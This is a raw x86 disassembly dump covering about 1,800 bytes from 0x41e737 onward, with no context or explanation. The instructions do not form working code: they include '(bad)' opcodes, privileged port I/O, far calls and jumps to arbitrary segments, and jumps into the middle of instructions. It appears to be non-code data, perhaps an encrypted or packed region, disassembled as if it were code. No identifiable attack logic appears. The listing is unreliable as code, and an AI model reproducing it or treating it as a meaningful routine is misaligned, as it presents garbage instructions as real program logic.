  41e737:	lods   al,BYTE PTR ds:[esi]
  41e738:	adc    dx,WORD PTR [ebp+0xfc345ca]
  41e73f:	jno    0x41e7a2
  41e741:	sbb    DWORD PTR [esi-0x3],esp
  41e744:	pop    eax
  41e745:	inc    BYTE PTR [esi+0xfe225e4]
  41e74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e74c:	xlat   BYTE PTR ds:[ebx]
  41e74d:	dec    edi
  41e74e:	loop   0x41e76d
  41e750:	shl    BYTE PTR [edi-0x38],1
  41e753:	in     eax,dx
  41e754:	push   ds
  41e755:	cmp    al,0x2
  41e757:	jno    0x41e756
  41e759:	dec    edi
  41e75a:	repnz sub DWORD PTR [esi-0x3ca809ab],eax
  41e761:	daa    
  41e762:	sbb    al,0x1e
  41e764:	ss enter 0xf6,0x13
  41e769:	jbe    0x41e6fd
  41e76b:	xchg   esp,eax
  41e76c:	out    0x50,eax
  41e76e:	push   ebp
  41e76f:	sbb    ah,BYTE PTR [edi]
  41e771:	add    eax,0x29b5da94
  41e776:	and    ebp,esp
  41e778:	int3   
  41e779:	mov    ch,0xfe
  41e77b:	scas   al,BYTE PTR es:[edi]
  41e77c:	adc    ecx,0x78
  41e77f:	in     al,dx
  41e780:	loope  0x41e718
  41e782:	sub    eax,DWORD PTR [edi]
  41e784:	sub    edi,edi
  41e786:	adc    bh,BYTE PTR [ecx+0x7a835b3]
  41e78c:	call   0xe927:0xde656694
  41e793:	les    ebx,FWORD PTR [esi-0x1e13eb71]
  41e799:	push   ebp
  41e79a:	fiadd  WORD PTR [eax]
  41e79c:	dec    ebp
  41e79d:	adc    al,0xbb
  41e79f:	aad    0x78
  41e7a1:	out    0xe0,al
  41e7a3:	cmp    DWORD PTR [eax+0x31],ecx
  41e7a6:	dec    ecx
  41e7a7:	xor    ebx,DWORD PTR [ebx+0x25e3db9d]
  41e7ad:	scas   al,BYTE PTR es:[edi]
  41e7ae:	std    
  41e7af:	aaa    
  41e7b0:	addr16 retf 0xf3ef
  41e7b4:	mov    ch,0x51
  41e7b6:	adc    BYTE PTR [ecx+0x74c6c2ac],0x3b
  41e7bd:	mov    edi,0x79996ea7
  41e7c2:	in     al,dx
  41e7c3:	jb     0x41e77f
  41e7c5:	add    al,0x81
  41e7c7:	or     cl,bh
  41e7c9:	iret   
  41e7ca:	shl    BYTE PTR [ecx+0x72],0xec
  41e7ce:	xor    eax,DWORD PTR [esi]
  41e7d0:	(bad)  
  41e7d1:	push   ebp
  41e7d2:	push   es
  41e7d3:	loopne 0x41e840
  41e7d5:	cmp    DWORD PTR [edi+0x16],ebp
  41e7d8:	pop    ss
  41e7d9:	xor    edx,esi
  41e7db:	pop    ds
  41e7dc:	ret    
  41e7dd:	iret   
  41e7de:	xchg   edi,eax
  41e7df:	push   esp
  41e7e0:	dec    edx
  41e7e1:	call   0x816a:0x434d0adc
  41e7e8:	repz xchg ecx,eax
  41e7ea:	sub    al,0xc4
  41e7ec:	cmp    cl,BYTE PTR [ecx]
  41e7ee:	idiv   BYTE PTR [esi+0x4c]
  41e7f1:	mov    esp,edx
  41e7f3:	les    edx,FWORD PTR [edx+0x5ba2b85b]
  41e7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7fa:	xchg   edx,eax
  41e7fb:	adc    ah,dl
  41e7fd:	adc    cl,BYTE PTR [ebp+eax*8+0x74ddc3f4]
  41e804:	cmp    dh,BYTE PTR [ebp+0x8]
  41e807:	ja     0x41e7e0
  41e809:	jo     0x41e811
  41e80b:	cmp    DWORD PTR [ecx+0x74],edi
  41e80e:	xchg   edx,eax
  41e80f:	in     eax,0xc6
  41e811:	in     eax,dx
  41e812:	lods   al,BYTE PTR ds:[esi]
  41e813:	sbb    BYTE PTR [edi],bl
  41e815:	sub    eax,0x4ba4cd38
  41e81a:	lods   eax,DWORD PTR ds:[esi]
  41e81b:	mov    bh,0xd8
  41e81d:	jp     0x41e7e4
  41e81f:	imul   ecx,ebx,0xffffffc4
  41e822:	rcl    bh,0xd7
  41e825:	scas   eax,DWORD PTR es:[edi]
  41e826:	cdq    
  41e827:	scas   al,BYTE PTR es:[edi]
  41e828:	push   edx
  41e829:	fwait
  41e82a:	pop    ds
  41e82b:	xlat   BYTE PTR ds:[ebx]
  41e82c:	and    DWORD PTR [esi+ebp*2],esp
  41e82f:	inc    edi
  41e830:	xchg   ebp,eax
  41e831:	(bad)  
  41e832:	xchg   ecx,eax
  41e833:	cmp    DWORD PTR [esi+0x5b64f72d],0xffffff89
  41e83a:	call   0x616082dd
  41e83f:	jb     0x41e7ed
  41e841:	jbe    0x41e806
  41e843:	bound  esp,QWORD PTR [ebx]
  41e845:	sbb    eax,DWORD PTR [ebx+ebx*8]
  41e848:	jo     0x41e8c4
  41e84a:	cmc    
  41e84b:	loope  0x41e7ed
  41e84d:	xrelease mov BYTE PTR [ebx+0x7d],al
  41e851:	sbb    BYTE PTR [edx],dh
  41e853:	out    dx,eax
  41e854:	jmp    0x41e7f7
  41e856:	idiv   BYTE PTR [edx]
  41e858:	ds push esi
  41e85a:	jp     0x41e81f
  41e85c:	dec    ebx
  41e85d:	xchg   esi,eax
  41e85e:	shl    DWORD PTR [ebx-0xa95a99b],cl
  41e864:	nop
  41e865:	xchg   ebx,eax
  41e866:	xor    DWORD PTR [eax+0x65],edi
  41e869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e86a:	fcomp  QWORD PTR [edx+eiz*8-0x4b3c5a49]
  41e871:	mov    ebx,0x86dc8391
  41e876:	jnp    0x41e8a0
  41e878:	mov    dl,0x8
  41e87a:	cld    
  41e87b:	mov    esp,ebp
  41e87d:	mov    dl,0x51
  41e87f:	jp     0x41e83b
  41e881:	mov    DWORD PTR [esi-0x6e56901a],edi
  41e887:	cli    
  41e888:	arpl   WORD PTR [esi],si
  41e88a:	and    eax,0x34b3d104
  41e88f:	sub    edi,DWORD PTR [eax]
  41e891:	jne    0x41e907
  41e893:	dec    ecx
  41e894:	rcl    DWORD PTR [eax],1
  41e896:	and    bh,BYTE PTR [edx+eax*1]
  41e899:	mov    BYTE PTR [edx],bh
  41e89b:	shr    DWORD PTR [edx],0x0
  41e89e:	lahf   
  41e89f:	or     al,0x87
  41e8a1:	push   ds
  41e8a2:	imul   eax,DWORD PTR [ebx-0x5015cc49],0xc2467041
  41e8ac:	mov    eax,0x18df9ed3
  41e8b1:	popa   
  41e8b2:	gs loop 0x41e8e5
  41e8b5:	adc    ebp,ecx
  41e8b7:	sbb    esp,DWORD PTR [edx+0x24b03779]
  41e8bd:	mov    ds,WORD PTR [edx+0x7a]
  41e8c0:	jmp    0x7cd35a1c
  41e8c5:	pusha  
  41e8c6:	gs mov ah,0x5
  41e8c9:	xor    dl,al
  41e8cb:	outs   dx,DWORD PTR ds:[esi]
  41e8cc:	dec    ecx
  41e8cd:	mov    ebx,edx
  41e8cf:	inc    edi
  41e8d0:	xor    BYTE PTR [eax+0x401c299f],0xa2
  41e8d7:	pop    ds
  41e8d8:	aas    
  41e8d9:	(bad)  
  41e8da:	sub    BYTE PTR [esi-0x2],bh
  41e8dd:	xlat   BYTE PTR ds:[ebx]
  41e8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8df:	les    ecx,FWORD PTR [ebx-0x3d]
  41e8e2:	ins    BYTE PTR es:[edi],dx
  41e8e3:	pushf  
  41e8e4:	pop    esi
  41e8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8e6:	and    bl,cl
  41e8e8:	pop    es
  41e8e9:	outs   dx,DWORD PTR ds:[esi]
  41e8ea:	cmp    al,0x82
  41e8ec:	loopne 0x41e890
  41e8ee:	mov    dh,0xc3
  41e8f0:	fmul   QWORD PTR [esi]
  41e8f2:	jnp    0x41e8e2
  41e8f4:	pop    ds
  41e8f5:	jbe    0x41e968
  41e8f7:	or     BYTE PTR [edx-0x5f],bl
  41e8fa:	ss cli 
  41e8fc:	mov    ds:0xf3a49df9,al
  41e901:	in     eax,dx
  41e902:	sub    dl,BYTE PTR [ebp+0x59]
  41e905:	pushf  
  41e906:	sbb    DWORD PTR [edi-0x14],eax
  41e909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e90a:	adc    DWORD PTR [ecx+0x7a2b688a],ebp
  41e910:	nop
  41e911:	aad    0xf8
  41e913:	jb     0x41e896
  41e915:	retf   0xbb85
  41e918:	mov    ebx,0x8e002d0b
  41e91d:	and    BYTE PTR [edx],cl
  41e91f:	ins    BYTE PTR es:[edi],dx
  41e920:	jo     0x41e922
  41e922:	xor    BYTE PTR [ebx+0x5],cl
  41e925:	fdiv   DWORD PTR [ecx]
  41e927:	rcr    esp,1
  41e929:	lods   eax,DWORD PTR ds:[esi]
  41e92a:	xlat   BYTE PTR ds:[ebx]
  41e92b:	pop    ebp
  41e92c:	ror    DWORD PTR [eax-0x34],cl
  41e92f:	push   ebp
  41e930:	mov    edi,0xb462924b
  41e935:	adc    edi,esp
  41e937:	out    0x67,eax
  41e939:	jnp    0x41e92f
  41e93b:	mov    dh,0x5e
  41e93d:	add    DWORD PTR [edx],esi
  41e93f:	and    esp,DWORD PTR [edi-0x5ccd2b5d]
  41e945:	inc    edi
  41e946:	jmp    0x41e94f
  41e948:	jge    0x41e911
  41e94a:	cmp    al,0x67
  41e94c:	cmp    al,0x8e
  41e94e:	push   edi
  41e94f:	adc    ah,BYTE PTR [ecx-0x4fde2d78]
  41e955:	and    DWORD PTR [ebx+0x3b],edi
  41e958:	into   
  41e959:	clc    
  41e95a:	call   0x40bf:0x5f4a6f5f
  41e961:	cld    
  41e962:	imul   eax,DWORD PTR [esi+ecx*1+0xb3ec22c],0x7
  41e96a:	jbe    0x41e96f
  41e96c:	arpl   WORD PTR [eax],di
  41e96e:	xchg   bh,dl
  41e970:	clc    
  41e971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e972:	and    eax,0xfd82a5ea
  41e977:	mov    al,0xa8
  41e979:	mov    ch,0x64
  41e97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e97c:	into   
  41e97d:	test   DWORD PTR ds:0x609dd2fa,esi
  41e983:	jno    0x41e97a
  41e985:	jmp    0xa062:0x8ae66494
  41e98c:	out    0xcf,al
  41e98e:	stos   BYTE PTR es:[edi],al
  41e98f:	rcr    BYTE PTR [edx+0x2207cdd4],1
  41e995:	xor    ecx,DWORD PTR [edx]
  41e997:	mov    ch,0x8b
  41e999:	dec    edi
  41e99a:	dec    edi
  41e99b:	icebp  
  41e99c:	xor    BYTE PTR [ebp+0x4b],0x2
  41e9a0:	dec    ecx
  41e9a1:	lahf   
  41e9a2:	cmp    BYTE PTR [edi-0x4c],al
  41e9a5:	push   edx
  41e9a6:	jg     0x41e9ad
  41e9a8:	retf   
  41e9a9:	out    0xe3,eax
  41e9ab:	pop    es
  41e9ac:	sbb    DWORD PTR [edi+0x6dfafd21],edi
  41e9b2:	out    0x9,al
  41e9b4:	pop    edi
  41e9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9b6:	stc    
  41e9b7:	jbe    0x41e9ee
  41e9b9:	mov    ebx,0x8de1ac02
  41e9be:	push   0xfffffff3
  41e9c0:	loopne 0x41ea2c
  41e9c2:	arpl   bp,bp
  41e9c4:	fwait
  41e9c5:	enter  0xef63,0x75
  41e9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9ca:	ins    DWORD PTR es:[edi],dx
  41e9cb:	hlt    
  41e9cc:	xor    DWORD PTR [edi-0x11],esi
  41e9cf:	call   0xd852:0xdf991700
  41e9d6:	cmp    ah,BYTE PTR [edx]
  41e9d8:	(bad)  
  41e9d9:	outs   dx,DWORD PTR ds:[esi]
  41e9da:	(bad)  
  41e9db:	mov    bh,0xea
  41e9dd:	pop    ss
  41e9de:	test   DWORD PTR [ecx+ebp*1-0x6e],esi
  41e9e2:	mov    dl,0xb2
  41e9e4:	ficom  DWORD PTR [esi]
  41e9e6:	loope  0x41e9fb
  41e9e8:	cmp    bl,ch
  41e9ea:	jp     0x41e9b5
  41e9ec:	cmp    ch,0xd3
  41e9ef:	jg     0x41ea1e
  41e9f1:	adc    eax,ebx
  41e9f3:	mov    ebx,0x94a59d3b
  41e9f8:	lahf   
  41e9f9:	jo     0x41ea3d
  41e9fb:	ret    0x6a7b
  41e9fe:	cmc    
  41e9ff:	or     DWORD PTR [ebx],esp
  41ea01:	stos   DWORD PTR es:[edi],eax
  41ea02:	xchg   edi,eax
  41ea03:	cmp    eax,0xf2b41d12
  41ea08:	aas    
  41ea09:	jecxz  0x41ea58
  41ea0b:	jnp    0x41e9e9
  41ea0d:	sub    DWORD PTR [esp+edi*4-0x5e234ab0],ecx
  41ea14:	aas    
  41ea15:	push   0x2
  41ea17:	sub    eax,0x22c154b
  41ea1c:	mov    ebp,0x3be360c3
  41ea21:	cmp    edi,edi
  41ea23:	fstp   DWORD PTR ss:[ebp-0x38]
  41ea27:	adc    DWORD PTR [esi+0xcba93f4],ebx
  41ea2d:	hlt    
  41ea2e:	dec    ebp
  41ea2f:	mov    esp,0x7cacbb74
  41ea34:	or     dh,BYTE PTR ds:0xcb122115
  41ea3a:	xchg   esp,eax
  41ea3b:	sbb    eax,0xf5e2bde5
  41ea40:	hlt    
  41ea41:	mov    edi,0xf1939f88
  41ea46:	ds mov ch,0xfe
  41ea49:	loope  0x41e9f1
  41ea4b:	mov    bh,0xad
  41ea4d:	jmp    0xd111:0xbb12f77e
  41ea54:	inc    ebp
  41ea55:	sbb    BYTE PTR [ebx+0x338581f9],bl
  41ea5b:	add    BYTE PTR [eax],dh
  41ea5d:	adc    al,0x5f
  41ea5f:	jb     0x41ea1b
  41ea61:	jne    0x41ea2d
  41ea63:	icebp  
  41ea64:	or     al,0xb6
  41ea66:	add    ah,ch
  41ea68:	shl    DWORD PTR [edx],0x78
  41ea6b:	les    esi,FWORD PTR ss:[ebx]
  41ea6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea6f:	pop    esi
  41ea70:	xor    eax,0x3474cbf7
  41ea75:	sti    
  41ea76:	clc    
  41ea77:	out    dx,eax
  41ea78:	jo     0x41eac2
  41ea7a:	inc    esi
  41ea7b:	call   0x7513:0x40d2145b
  41ea82:	and    dl,BYTE PTR [esp+eiz*4]
  41ea85:	mov    edx,0x28965f4d
  41ea8a:	jge    0x41ea95
  41ea8c:	mov    eax,ds:0x9187dbaa
  41ea91:	ss mov ebx,0x82850217
  41ea97:	cld    
  41ea98:	xchg   esi,eax
  41ea99:	ja     0x41ea57
  41ea9b:	rcl    BYTE PTR [edi+0x34],1
  41ea9e:	pusha  
  41ea9f:	pop    ebp
  41eaa0:	mov    dl,BYTE PTR [esi+0x69e80c87]
  41eaa6:	and    BYTE PTR ds:0xf21ddece,dh
  41eaac:	popf   
  41eaad:	and    dl,bh
  41eaaf:	add    BYTE PTR [ebx-0x67],0xb5
  41eab3:	jge    0x41ea95
  41eab5:	mov    bl,0xed
  41eab7:	stos   DWORD PTR es:[edi],eax
  41eab8:	xchg   BYTE PTR [eax-0xc1feb76],bh
  41eabe:	adc    ecx,DWORD PTR [ecx-0x371309c]
  41eac4:	stc    
  41eac5:	xor    ecx,DWORD PTR [esi+0x57]
  41eac8:	imul   ecx,ebx,0xac133042
  41eace:	xor    edx,DWORD PTR ds:0x54c45dc2
  41ead4:	cmp    DWORD PTR [ebx+ebp*2],eax
  41ead7:	out    dx,al
  41ead8:	cli    
  41ead9:	and    ebp,ecx
  41eadb:	push   edx
  41eadc:	jmp    0xbb83c9f3
  41eae1:	test   ecx,esp
  41eae3:	mov    ah,0x7
  41eae5:	mov    al,bh
  41eae7:	lahf   
  41eae8:	mov    eax,ds:0x1f1b61d2
  41eaed:	ins    BYTE PTR es:[edi],dx
  41eaee:	fistp  DWORD PTR [ecx+0x55]
  41eaf1:	pop    edi
  41eaf2:	aaa    
  41eaf3:	fist   DWORD PTR [ebx]
  41eaf5:	mov    bh,0x63
  41eaf7:	inc    esp
  41eaf8:	xchg   ebx,eax
  41eaf9:	hlt    
  41eafa:	xor    eax,DWORD PTR [eax]
  41eafc:	mov    esp,0xebcf61cb
  41eb01:	lock push 0x9c496240
  41eb07:	test   eax,0x5de23068
  41eb0c:	imul   esi,DWORD PTR [eax+0xf],0x25c0a51c
  41eb13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb14:	call   0x454:0x3dd9504c
  41eb1b:	sbb    DWORD PTR [edi+ebp*2+0x7216b352],0xfcd948b1
  41eb26:	ins    BYTE PTR es:[edi],dx
  41eb27:	loope  0x41eae7
  41eb29:	dec    ecx
  41eb2a:	fmul   st,st(7)
  41eb2c:	sbb    dh,BYTE PTR [esi+0x224191fd]
  41eb32:	fisubr DWORD PTR [ecx]
  41eb34:	jmp    0xbe8b:0x9cb7e091
  41eb3b:	test   DWORD PTR [esi-0x31],0xe7f433b7
  41eb42:	retf   0x3e59
  41eb45:	sti    
  41eb46:	and    ebx,DWORD PTR [ebp+esi*2+0x58]
  41eb4a:	inc    ebx
  41eb4b:	fs nop
  41eb4d:	iret   
  41eb4e:	xor    esp,edi
  41eb50:	add    bl,BYTE PTR [eax-0x1e64d55a]
  41eb56:	loop   0x41eb22
  41eb58:	leave  
  41eb59:	sti    
  41eb5a:	mov    ebp,0x578ca35f
  41eb5f:	xchg   esi,eax
  41eb60:	sub    al,0x6e
  41eb62:	stos   BYTE PTR es:[edi],al
  41eb63:	stos   DWORD PTR es:[edi],eax
  41eb64:	scas   al,BYTE PTR es:[edi]
  41eb65:	repnz mov ds:0x99afa6d7,al
  41eb6b:	scas   eax,DWORD PTR es:[edi]
  41eb6c:	retf   0x9890
  41eb6f:	and    al,0x24
  41eb71:	mov    bl,0x84
  41eb73:	(bad)  
  41eb74:	stc    
  41eb75:	sbb    ebx,esi
  41eb77:	sub    cl,BYTE PTR [ecx-0x14]
  41eb7a:	pop    esp
  41eb7b:	cli    
  41eb7c:	loope  0x41eb77
  41eb7e:	sar    BYTE PTR [ebx],cl
  41eb80:	(bad)  [edi]
  41eb82:	loopne 0x41ebb6
  41eb84:	(bad)  
  41eb85:	fiadd  DWORD PTR [edx+esi*2]
  41eb88:	ja     0x41eb65
  41eb8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb8b:	mov    ebp,0xc366a232
  41eb90:	outs   dx,BYTE PTR ds:[esi]
  41eb91:	cli    
  41eb92:	fbstp  TBYTE PTR [edx+0x29b919]
  41eb98:	stc    
  41eb99:	int    0x5e
  41eb9b:	xor    ebx,edi
  41eb9d:	push   edi
  41eb9e:	lock call 0x2f4c:0x3e757033
  41eba6:	test   eax,edi
  41eba8:	mov    eax,ds:0x388109e4
  41ebad:	lahf   
  41ebae:	scas   al,BYTE PTR es:[edi]
  41ebaf:	jecxz  0x41eb67
  41ebb1:	sbb    BYTE PTR [esi+0x2494a431],ah
  41ebb7:	out    dx,al
  41ebb8:	inc    esp
  41ebb9:	test   BYTE PTR [ebx-0x3fec66fa],dh
  41ebbf:	fs push 0x7e
  41ebc2:	ficomp DWORD PTR [esi+eax*1+0x23082581]
  41ebc9:	xor    al,0xf0
  41ebcb:	popa   
  41ebcc:	jns    0x41ebcb
  41ebce:	call   0xba6d39e0
  41ebd3:	dec    ebp
  41ebd4:	cmp    edx,edi
  41ebd6:	pushf  
  41ebd7:	pushf  
  41ebd8:	aaa    
  41ebd9:	icebp  
  41ebda:	ret    0x3a0a
  41ebdd:	hlt    
  41ebde:	cwde   
  41ebdf:	lea    esi,[ebx-0x10bdc855]
  41ebe5:	push   ss
  41ebe6:	push   ss
  41ebe7:	bound  esp,QWORD PTR [ebp+ebp*1-0x27e9b073]
  41ebee:	(bad)
  41ebf1:	mov    eax,ds:0x570ca5b4
  41ebf6:	je     0x41eb96
  41ebf8:	jle    0x41ec20
  41ebfa:	addr16 sbb eax,0xbc63c4cd
  41ec00:	dec    ecx
  41ec01:	cmp    DWORD PTR [edx+0x14],0xffffffdf
  41ec05:	jo     0x41ebaa
  41ec07:	(bad)  
  41ec08:	pop    edi
  41ec09:	popf   
  41ec0a:	in     eax,0xf4
  41ec0c:	pop    esi
  41ec0d:	aaa    
  41ec0e:	adc    eax,0xea9e764e
  41ec13:	fimul  DWORD PTR [eax]
  41ec15:	add    DWORD PTR [esi+0x3f1fb596],edx
  41ec1b:	push   ss
  41ec1c:	push   edx
  41ec1d:	rcr    edx,0x83
  41ec20:	add    esi,DWORD PTR [ebp-0xd888bb]
  41ec26:	out    0x4c,eax
  41ec28:	mov    ?,WORD PTR [eax+0x6a49ee39]
  41ec2e:	int3   
  41ec2f:	sbb    al,0xbf
  41ec31:	inc    ebp
  41ec32:	adc    ebx,esp
  41ec34:	fisub  DWORD PTR [eax+eiz*8-0x46]
  41ec38:	dec    ebp
  41ec39:	rcpps  xmm0,XMMWORD PTR [edi-0x7a]
  41ec3d:	test   eax,0xbdd097ce
  41ec42:	ins    DWORD PTR es:[edi],dx
  41ec43:	and    al,0x49
  41ec45:	push   edi
  41ec46:	mov    ebp,0x72224e93
  41ec4b:	shl    BYTE PTR [ebx+eiz*1+0x54],1
  41ec4f:	dec    ebp
  41ec50:	adc    edx,DWORD PTR [esi]
  41ec52:	adc    al,dl
  41ec54:	retf   
  41ec55:	push   ebx
  41ec56:	not    DWORD PTR [ecx]
  41ec58:	imul   ebx,esi,0x813fc7c9
  41ec5e:	pop    esi
  41ec5f:	xor    BYTE PTR [eax],dl
  41ec61:	retf   0x2a20
  41ec64:	mov    bl,0xae
  41ec66:	int    0xc7
  41ec68:	sbb    ecx,edi
  41ec6a:	inc    ebx
  41ec6b:	xor    ah,BYTE PTR [eax+0x6fbac0ff]
  41ec71:	xor    dh,al
  41ec73:	neg    DWORD PTR [ecx+0x2b40ae3]
  41ec79:	enter  0xceb9,0xe3
  41ec7d:	clc    
  41ec7e:	jge    0x41ecba
  41ec80:	scas   al,BYTE PTR es:[edi]
  41ec81:	cwde   
  41ec82:	pop    esp
  41ec83:	pusha  
  41ec84:	dec    ebp
  41ec85:	fidivr WORD PTR [eax]
  41ec87:	xor    al,0xeb
  41ec89:	mov    ss,esp
  41ec8b:	fwait
  41ec8c:	pop    esi
  41ec8d:	inc    edi
  41ec8e:	or     ecx,DWORD PTR [esi]
  41ec90:	dec    esp
  41ec92:	dec    edx
  41ec93:	fimul  DWORD PTR [ecx+0x34]
  41ec96:	push   edi
  41ec97:	sbb    BYTE PTR [eax+0x1e],0x97
  41ec9b:	mov    ecx,0xd6e3ec8b
  41eca0:	mov    ebx,0x72fe9b41
  41eca5:	pop    esi
  41eca6:	(bad)  
  41eca7:	call   0xae3d:0xe349965d
  41ecae:	repz mov gs,WORD PTR [ebp+eax*8-0x49]
  41ecb3:	mov    edi,0xd5d9e062
  41ecb8:	(bad)  
  41ecb9:	cli    
  41ecba:	loopne 0x41ecad
  41ecbc:	jb     0x41ecb1
  41ecbe:	mov    bl,0xf
  41ecc0:	cwde   
  41ecc1:	jb     0x41ecbe
  41ecc3:	jp     0x41ec5f
  41ecc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecc6:	div    BYTE PTR [ecx-0xc5686cb]
  41eccc:	xor    ecx,edx
  41ecce:	sahf   
  41eccf:	push   ss
  41ecd0:	mov    dh,0x6e
  41ecd2:	mov    eax,ds:0x32709583
  41ecd7:	jecxz  0x41ec82
  41ecd9:	in     al,0x30
  41ecdb:	xchg   esp,eax
  41ecdc:	mov    edi,0x8b946cb9
  41ece1:	mov    ebp,0xdee8e0ed
  41ece6:	pushf  
  41ece7:	shr    BYTE PTR ds:0xac768fec,cl
  41eced:	fstp   TBYTE PTR ds:0x2bfb8cac
  41ecf3:	mov    BYTE PTR [ebp+0x23],cl
  41ecf6:	mov    bl,0x9b
  41ecf8:	and    eax,0x516784b1
  41ecfd:	and    esp,DWORD PTR [edi]
  41ecff:	js     0x41ecaf
  41ed01:	arpl   WORD PTR [ecx-0x70],bp
  41ed04:	les    ecx,FWORD PTR [ecx-0x639ab15d]
  41ed0a:	sub    ebp,DWORD PTR ds:0x225f817a
  41ed10:	jo     0x41ec99
  41ed12:	mov    edi,0xe0f09ae4
  41ed17:	in     eax,dx
  41ed18:	mov    ebp,0x4982a34
  41ed1d:	fdiv   QWORD PTR [ebx-0x6d]
  41ed20:	into   
  41ed21:	push   edi
  41ed22:	into   
  41ed23:	ja     0x41ed87
  41ed25:	dec    ebx
  41ed26:	xlat   BYTE PTR ds:[ebx]
  41ed27:	sbb    eax,0xd4e0b190
  41ed2c:	ficom  WORD PTR [ecx]
  41ed2e:	xor    edx,DWORD PTR [eax-0x3a54fa5f]
  41ed34:	xchg   esp,eax
  41ed35:	inc    ecx
  41ed36:	xlat   BYTE PTR ds:[ebx]
  41ed37:	push   ebx
  41ed38:	ds retf 
  41ed3a:	jmp    0x4da1bb53
  41ed3f:	out    0xa7,al
  41ed41:	mov    al,0xb5
  41ed43:	loop   0x41ed01
  41ed45:	mov    ah,BYTE PTR [ebp+edx*4-0x7cb203b9]
  41ed4c:	jge    0x41ed18
  41ed4e:	pusha  
  41ed4f:	rcr    DWORD PTR [esi],0x24
  41ed52:	stos   BYTE PTR es:[edi],al
  41ed53:	pushf  
  41ed54:	cmp    eax,0x1a0e5b08
  41ed59:	loopne 0x41ed3e
  41ed5b:	pop    esi
  41ed5c:	dec    esp
  41ed5d:	imul   ecx,DWORD PTR [ebp+0x45],0x6c192065
  41ed64:	in     eax,0x11
  41ed66:	dec    ebx
  41ed67:	and    dl,BYTE PTR [esi-0x78]
  41ed6a:	pop    ebp
  41ed6b:	and    BYTE PTR [edx],0x30
  41ed6e:	popf   
  41ed6f:	push   ecx
  41ed70:	xchg   esi,eax
  41ed71:	xchg   edi,eax
  41ed72:	mov    cl,0x83
  41ed74:	jecxz  0x41ed9a
  41ed76:	xchg   DWORD PTR [esi],esi
  41ed78:	sar    edi,cl
  41ed7a:	sbb    al,0x89
  41ed7c:	add    bl,BYTE PTR [ebp+0x2f2f0a6c]
  41ed82:	mov    dh,0xba
  41ed84:	outs   dx,BYTE PTR ss:[esi]
  41ed86:	xor    ch,BYTE PTR [ecx+edi*1-0x77]
  41ed8a:	mul    BYTE PTR [edx+0x35119e1f]
  41ed90:	inc    eax
  41ed91:	push   0x27
  41ed93:	fs das 
  41ed95:	addr16 jmp 0x4e7c:0x183a963e
  41ed9d:	test   eax,0x3529c1cd
  41eda2:	ins    BYTE PTR es:[edi],dx
  41eda3:	shl    DWORD PTR [ebx+0x42bf925b],cl
  41eda9:	jmp    0x8915dacf
  41edae:	lea    esi,[eax-0x5c]
  41edb1:	push   ebx
  41edb2:	mov    al,0xc1
  41edb4:	lahf   
  41edb5:	push   ds
  41edb6:	mov    gs,esi
  41edb8:	mov    dl,0xea
  41edba:	add    DWORD PTR [edx],esi
  41edbc:	retf   
  41edbd:	xor    eax,0x84465eb9
  41edc2:	jmp    0x41ed85
  41edc4:	nop
  41edc5:	mov    al,ds:0x7543b914
  41edca:	pop    ecx
  41edcb:	add    dh,BYTE PTR [ecx]
  41edcd:	mov    al,0xfe
  41edcf:	outs   dx,BYTE PTR ds:[esi]
  41edd0:	pop    ss
  41edd1:	inc    eax
  41edd2:	adc    ah,BYTE PTR [edx]
  41edd4:	mov    ebx,0xf80fc27a
  41edd9:	pop    ecx
  41edda:	inc    edx
  41eddb:	int    0xdb
  41eddd:	stos   BYTE PTR es:[edi],al
  41edde:	(bad)  
  41eddf:	fsubr  QWORD PTR ds:0x4c1383f
  41ede5:	or     ecx,ecx
  41ede7:	push   edi
  41ede8:	mov    ds:0xa8e3cf83,al
  41eded:	mov    ebx,0x3e19fcfd
  41edf2:	lea    ebp,[ecx-0x31ea57ad]
  41edf8:	popf   
  41edf9:	xlat   BYTE PTR ds:[ebx]
  41edfa:	push   ebp
  41edfb:	ror    BYTE PTR ds:0x3804e246,cl
  41ee01:	mov    edi,0xa0ff2e7b
  41ee06:	lock xor al,ah
  41ee09:	stos   BYTE PTR es:[edi],al
  41ee0a:	jmp    0x41ed8d
  41ee0c:	pop    ecx
  41ee0d:	bound  esp,QWORD PTR [ebx+eax*8+0x57dbc30]
  41ee14:	mov    ch,0x9
  41ee16:	out    0x1d,al
  41ee18:	pop    ebx
  41ee19:	or     eax,0x979c5778
  41ee1e:	jmp    0x6185:0xf819e5a7
  41ee25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee26:	cmp    eax,0xabae6460
  41ee2b:	(bad)  
  41ee2c:	daa    
  41ee2d:	cmp    ecx,DWORD PTR [edx+esi*4+0x19]
  41ee31:	fs pop ecx
  41ee33:	dec    ecx
  41ee34:	lods   eax,DWORD PTR ds:[esi]
  41ee35:	cmp    bl,ah
  41ee37:	inc    ecx
  41ee38:	(bad)  
  41ee39:	jp     0x41ee51
  41ee3b:	pop    eax
  41ee3c:	mov    edi,0x7a64a7d7
  41ee41:	mov    ah,0xb6
  41ee43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee44:	popf   
  41ee45:	outs   dx,BYTE PTR ds:[esi]
  41ee46:	and    eax,0x82c54835
  41ee4b:	add    edi,eax
  41ee4d:	sub    al,0x52
  41ee4f:	cli    
  41ee50:	adc    cl,BYTE PTR [ebx-0x1d]
  41ee53:	dec    ebx
  41ee54:	mov    bl,0x22
  41ee56:	loopne 0x41ee5c
  41ee58:	fs pop edi
  41ee5a:	test   ah,bh
  41ee5c:	dec    edx
  41ee5d:	fisub  WORD PTR [eax+eax*2]
  41ee60:	lods   al,BYTE PTR ds:[esi]
  41ee61:	push   ebp
  41ee62:	inc    esp
